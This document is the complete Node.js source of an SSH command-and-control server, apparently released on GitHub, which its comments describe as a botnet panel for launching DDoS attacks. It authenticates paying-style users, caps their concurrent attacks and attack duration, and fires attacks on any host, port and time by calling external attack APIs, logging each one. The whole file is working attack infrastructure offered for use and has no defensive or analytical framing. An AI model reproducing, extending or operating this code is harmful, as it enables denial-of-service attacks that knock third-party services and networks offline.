// NodeJS SSH2 Command and Control server to launch DDoS attacks using API
// Coded by forky (tg: @yfork)
// v0.0.1
// This was released on github.com/forkyyy


const fs = require('fs');
const ssh2 = require('ssh2');
const axios = require('axios');

//database
const users = require('./users.json').users;

//servers
const servers = require('./servers.json');

//attacks log
const attacksLog = require('./attacks.json').attacks;

//botnet name, banner(optional) and port
const cnc_name = "CatSlammerC2";
const cnc_port = 2222;

function send_attack(client, method, ...args) {

    const [host, port, time] = args;

    const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^:(:[0-9a-fA-F]{1,4}){1,7}$/;
    const ipRangeRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$/;

    if (host.startsWith("http://") || host.startsWith("https://")) {
        // Check for potential URL injection
        const forbiddenCharacters = ['"', "'", '%', '&', '$', '|', ';', '(', ')', '[', ']', '{', '}'];
        for (const char of forbiddenCharacters) {
            if (host.includes(char)) {
                return `Invalid input: URL injection detected (${char})`;
            }
        }
    } else {
        // Check for a valid IPv4 or IPv4 Subnet
        if (!ipRegex.test(host) && !ipRangeRegex.test(host)) {
            return 'Invalid host or host range\r\n';
        }
    }

    //check if port is valid
    if (port < 0 || port > 65535) {
        return 'Invalid port number\r\n';
    }

    //check if time is valid
    if (time < 10 || time > 86400) {
        return 'Invalid time value\r\n';
    }

    //check if method is valid
    if (!servers.hasOwnProperty(method)) {
        return `Unknown attack method '${method}'\r\n`;
    }

    const user = users.find(user => user.username === client.username) || {};
    let clientAttacks = user.attacks || [];

    // Check if the user has reached their max concurrent attacks
    if (clientAttacks.length >= user.concurrents) {
        return `You have reached your max concurrent attacks (${user.concurrents}).\r\n`;
    }

    // Check if the attack will exceed the user's max boot time
    if (time > user.max_boot) {
        return `The attack time (${time} seconds) exceeds your max boot time (${user.max_boot} seconds).\r\n`;
    }

    const url = servers[method].api
        .replace('$host', host)
        .replace('$port', port)
        .replace('$time', time);

    // Add the attack to the client's list of active attacks
    const attack = {
        method,
        host,
        port,
        time,
        end_time: Date.now() + time * 1000
    };

    //add the attack to the launched attacks
    clientAttacks.push(attack);

    axios.get(url)
        .then(response => {
            //console.log(response.data);
            // Remove the attack from the client's list of active attacks once it has ended
            setTimeout(() => {
                clientAttacks = clientAttacks.filter(a => a !== attack);
                user.attacks = clientAttacks; // update user's active attacks
                console.log(`${cnc_name} - attack ended on ${attack.host}`)
            }, time * 1000);
        })
        .catch(error => {
            //console.error(error);
            clientAttacks = clientAttacks.filter(a => a !== attack);
            user.attacks = clientAttacks; // update user's active attacks
            console.log(`${cnc_name} - failed to attack ${attack.host}`)
        });

    //log the attack on the json file
    attacksLog.push({
        ...attack,
        username: user.username
    }) 
    fs.writeFileSync('./attacks.json', JSON.stringify({
        attacks: attacksLog
    })) 

    //log the attack on console and returns the api call
    console.log(`${cnc_name} - attack sent to ${attack.host}:${attack.port} using ${attack.method} by ${user.username}`)
    return `${method} attack sent to ${host}:${port} for ${time} seconds\r\n`;
}

(async () => {
    startServer();
})();

function startServer() {
    var server = new ssh2.Server({
        hostKeys: [fs.readFileSync("/etc/ssh/ssh_host_rsa_key")]
    }, (client) => {
        client.on('authentication', async (ctx) => {
            client.username = ctx.username;
            client.password = ctx.password;

            if (ctx.method === 'password') {
                try {
                    const user = users.find(user => user.username === client.username && user.password === client.password);
                    if (user) {
                        return ctx.accept();
                    } else {
                        return ctx.reject();
                    }
                } catch (e) {
                    return ctx.reject();
                }
            } else {
                return ctx.reject(['password']);
            }
        });

        client.on('ready', () => {
            client.on('session', (accept, reject) => {
                const session = accept();

                session.on('pty', (accept, reject, info) => {
                    accept();
                });

                session.once('shell', (accept, reject, info) => {
                    var stream = accept();
                    stream.write(`\x1b]0;${cnc_name} - Botnet\x07`);

                    var chunk = '';
                    stream.write(`\x1b[2J\x1b[1H`)
                    stream.on('data', async (data) => {
                        var stringData = data.toString();
                        if (stringData != '\r') {
                            chunk += stringData;
                            stream.write(data);
                        } else {
                            stream.write('\r\n');
                            try {
                                const availableMethods = Object.keys(servers);

                                var command = chunk.split(' ')[0];
                                var args = chunk.split(' ').slice(1);
                                chunk = '';

                                //methods command

                                if (command === 'methods' || command === '?') {
                                    stream.write(`Example: <method> <host> <port> <time>\r\n`);
                                    stream.write(`\r\n`);
                                    availableMethods.forEach((method) => {
                                        const description = servers[method].description;
                                        stream.write(`${method} - ${description}\r\n`);
                                    });
                                    stream.write(`\r\n`);
                                } 
                                //send attacks

                                else if (availableMethods.includes(command)) {
                                    var response = send_attack(client, command, ...args);
                                    stream.write(response);
                                } 

                                //clear command
                                else if (command === 'cls' || command === 'clear') {
                                    stream.write(`\x1b[2J\x1b[1H`)
                                } 

                                //exit command
                                else if (command === 'exit') {
                                    stream.end();
                                } 

                                //invalid command
                                else {
                                    if (command != '') stream.write(`${command}: command not found\r\n`);
                                }

                                stream.write(`${client.username}@botnet~# `);
                            } catch (e) {}
                        }
                    });

                    if (typeof stream != 'undefined') {
                        stream.write(`${client.username}@botnet~# `);
                    }

                });
            });
        });

        client.on('end', () => {});
        client.on('close', () => {});
        client.on('error', () => {});
    });

    server.listen(cnc_port, () => console.log(`${cnc_name} started - listening for ssh connections on port ${cnc_port}`));
}
